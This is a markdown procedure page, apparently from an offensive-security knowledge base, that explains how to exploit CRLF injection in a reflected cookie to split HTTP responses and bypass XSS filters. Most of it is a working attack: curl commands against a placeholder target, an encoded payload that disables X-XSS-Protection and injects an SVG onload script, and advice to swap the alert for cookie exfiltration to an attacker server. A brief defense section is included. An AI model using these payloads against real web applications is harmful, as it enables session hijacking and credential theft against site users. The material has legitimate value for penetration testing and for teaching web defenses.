---
type: procedure
description: >-
  Inject CRLF sequences into a cookie value to split HTTP response headers and
  inject an XSS payload, bypassing filters by disabling protections and
  embedding malicious JavaScript.
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - crlf-injection
  - xss-bypass
  - http-response-splitting
  - web-injection
commands:
  - '[[commands/curl-send-crlf-cookie]]'
tools: []
platforms:
  - Web
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# CRLF-Cookie-Injection-for-XSS-Bypass

## Summary

This procedure demonstrates how to exploit a CRLF injection vulnerability in a web application's cookie handling to bypass XSS protections. By injecting carriage return line feed (CRLF) sequences into a cookie value that is reflected into HTTP response headers, an attacker can split the response to add custom headers (e.g., disabling X-XSS-Protection) and inject an XSS payload directly into the response body, leading to JavaScript execution in the victim's browser.

## Description

CRLF injection occurs when user-controlled input, such as a cookie value, is improperly sanitized and reflected into HTTP headers. If the application echoes the cookie into a header like 'Link' without validating for CRLF characters (%0d%0a), the attacker can terminate the original header and inject new ones, followed by a blank line to start the body. This allows embedding an XSS payload, such as an SVG onload alert, while setting headers to evade filters. The technique targets public-facing web apps vulnerable to response splitting, enabling session hijacking, credential theft, or further attacks. It requires the cookie to be settable (e.g., via client-side or proxy) and reflected server-side.

## Requirements

1. Network access to the vulnerable web application (e.g., ability to send HTTP requests).
2. Knowledge of the reflected cookie name (e.g., via source code review or testing).
3. Tools like curl or a proxy (e.g., Burp Suite) to craft and send custom HTTP requests with malicious cookies.
4. A vulnerable endpoint where the cookie value is echoed into response headers without CRLF sanitization.

## Defense

- Sanitize all user inputs, including cookies, by rejecting or encoding CRLF characters (%0d, %0a) before inclusion in headers.
- Use HTTP response header validation to prevent splitting, such as strict parsing or libraries like OWASP ESAPI.
- Enable and enforce Content Security Policy (CSP) and X-XSS-Protection headers to mitigate XSS even if injected.
- Monitor for anomalous response sizes or headers in web application firewalls (WAFs) like ModSecurity.

## Objectives

1. Inject CRLF sequences to split HTTP response headers via a reflected cookie.
2. Disable XSS protections and embed a JavaScript payload for execution.
3. Achieve XSS in the victim's browser to steal cookies, credentials, or perform actions on their behalf.

## Instructions

### Step 1: Identify the Reflection Point

**Context**: Determine which cookie is reflected into response headers. This often requires testing with a proxy to inspect responses or reviewing application source code for unsanitized echoes (e.g., in 'Link' or 'Location' headers).

Send a test request with a benign cookie value like 'test123' and check if it appears in the response headers.

**Command** ([[commands/curl-send-crlf-cookie]]):
```bash
curl -v -H "Cookie: reflected_cookie=test123" http://target.com/vulnerable-endpoint
```

> This command sends a request with a test cookie and uses -v for verbose output to inspect headers. Look for the cookie value in response headers to confirm reflection.

### Step 2: Craft the Malicious Payload

**Context**: Encode the CRLF injection to terminate the reflected header, add new headers (e.g., Content-Length to control body size, X-XSS-Protection:0 to disable filters), insert a blank line, and append the XSS payload in the body. The payload here uses an SVG tag for cross-browser XSS.

Use URL encoding for CRLF (%0d%0a) in the cookie value. The full payload starts after the reflection point.

**Code** ([[codes/CRLF-Encoded-XSS-Payload]]):

The payload string to set as the cookie value (replace 'reflected_cookie' with the actual name):

```text
%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

> This payload injects the necessary headers and body. Adjust the Content-Length (35 here) to match the XSS payload size. The trailing /../.. is optional padding.

### Step 3: Send the Injection Request

**Context**: Deliver the malicious cookie via HTTP request to trigger the injection. If the app sets cookies client-side, use a proxy to intercept and modify; otherwise, send directly.

Replace http://target.com with the vulnerable URL and 'reflected_cookie' with the actual cookie name.

**Command** ([[commands/curl-send-crlf-cookie]]):
```bash
curl -v -H "Cookie: reflected_cookie=%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e" http://target.com/vulnerable-endpoint
```

> This sends the crafted cookie. The -v flag shows the full response, including injected headers and body. If successful, the response will include the new headers and execute the XSS when rendered in a browser.

### Step 4: Verify Execution

**Context**: Confirm the XSS by loading the response in a browser or checking for alert execution. In a real attack, replace alert() with a payload to exfiltrate data (e.g., document.cookie to an attacker server).

Serve the response or visit the endpoint in a browser with the malicious cookie set (e.g., via dev tools).

Expected: Browser alert pops up with the domain name, indicating successful XSS.
